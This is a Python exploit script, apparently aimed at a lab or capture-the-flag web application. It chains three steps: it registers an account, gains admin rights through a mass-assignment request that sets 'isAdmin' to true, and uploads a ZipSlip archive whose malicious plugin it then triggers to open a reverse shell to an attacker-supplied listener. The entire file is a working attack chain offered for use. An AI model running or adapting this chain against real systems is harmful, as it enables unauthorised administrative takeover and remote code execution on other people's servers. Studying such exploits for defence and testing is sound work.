#!/usr/bin/env python3

import requests 
import traceback
from urllib.parse import urljoin
import argparse
import os

PROXY = {"http": "http://127.0.0.1:8080"}

def authBypass(target):
    """
    Create account -> login -> escalate privileges via mass assignment
    """
    crtAccUrl = urljoin(f"{target}:5000", "/api/register")
    headers = {"Content-Type": "application/json"}
    crtAccJson = {
        "email": "john@doe.ltd",
        "password": "Password!1234",
        "username": "johndoe"
    }
    print("[*] Creating new user account")
    try:
        crtAccRes = requests.post(crtAccUrl, headers=headers, json=crtAccJson)
        if "User registered successfully" in crtAccRes.text:
            print("[+] Account john@doe.ltd:Password!1234 has been created successfully.")
            # login
            lgnAccUrl = urljoin(f"{target}:5000", "/api/login")
            lgnAccJson = {"email": "john@doe.ltd", "password": "Password!1234"}
            print("[*] Logging in as john@doe.ltd")
            try:
                lgnRes = requests.post(lgnAccUrl, headers=headers, json=lgnAccJson)
                if "token" in lgnRes.text:
                    print("[+] Logged in successfully")
                    lgnResData = lgnRes.json()
                    nrmlUsrToken = lgnResData.get("token")
                    if not nrmlUsrToken:
                        raise KeyError("Token not found in response JSON")
                    # mass assignment
                    updtUrl = urljoin(f"{target}:5000", "/api/profile")
                    updtHeaders = {
                        "Content-Type": "application/json",
                        "x-auth-token": nrmlUsrToken
                    }
                    updtJson = {"email": "john@doe.ltd", "isAdmin": "true", "username": "johndoe"}
                    print("[*] Gaining administrative access...")
                    try:
                        updtRes = requests.put(updtUrl, headers=updtHeaders, json=updtJson)
                        if "Profile updated successfully" in updtRes.text:
                            print("[+] Update succeeded. You are admin now.")
                            updtResData = updtRes.json()
                            adminToken = updtResData.get("token")
                            if not adminToken:
                                raise KeyError("Token not found in response JSON")
                            print("[+] Administrative access new token:", adminToken)
                            return adminToken
                        else:
                            print("[-] Failed to update the profile info. Response:", updtRes.text)
                    except Exception as e:
                        print("[-] Error updating the profile details:", e)
                        traceback.print_exc()
                else:
                    print("[-] Login failed. Response:", lgnRes.text)
            except Exception as e:
                print("[-] Error logging in:", e)
                traceback.print_exc()
        else:
            print("[-] Couldn't register new user account. Response:", crtAccRes.text)
    except Exception as e:
        print("[-] Error sending the create account request:", e)
        traceback.print_exc()

def rce(target, admin_jwt, lhost, lport):
    """
    ZipSlip Attack to upload a malicious plugin
    """
    upldUrl = urljoin(f"{target}:5000", "/admin/storage")
    headers = {"x-auth-token": admin_jwt}
    zip_path = os.path.expanduser("~/evilarc/evil.zip")

    print("[*] Delivering the ZipSlip Attack...")
    try:
        with open(zip_path, "rb") as f:
            files = {"zipFile": ("evil.zip", f, "application/zip")}
            upldRes = requests.post(upldUrl, headers=headers, files=files)

        if "File successfully unzipped" in upldRes.text:
            print("[+] Zip has been uploaded and extracted.")
            # run malicious plugin
            revShellUrl = urljoin(f"{target}:5000", "/admin/plugin?plugin=shell")
            headers = {"x-auth-token": admin_jwt}
            print("[*] Triggering the reverse shell...")
            print(f"[*] Check your listener {lhost}:{lport}")
            requests.get(revShellUrl, headers=headers)
        else:
            print("[-] Failed to upload or extract the Zip file. Response:", upldRes.text)
    except Exception as e:
        print("[-] Error uploading the Zip file,", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(
        description="Mass Assignment to Administrative Access, ZipSlip to Gain RCE"
    )
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.178.230) (do not include the port number)")
    parser.add_argument("lhost", help="listener IP address")
    parser.add_argument("lport", help="listener port")
    args = parser.parse_args()

    adminJWT = authBypass(args.target)
    if adminJWT:
        rce(args.target, adminJWT, args.lhost, args.lport)
    else:
        print("[-] Couldn't gain administrative privileges")

if __name__ == "__main__":
    main()
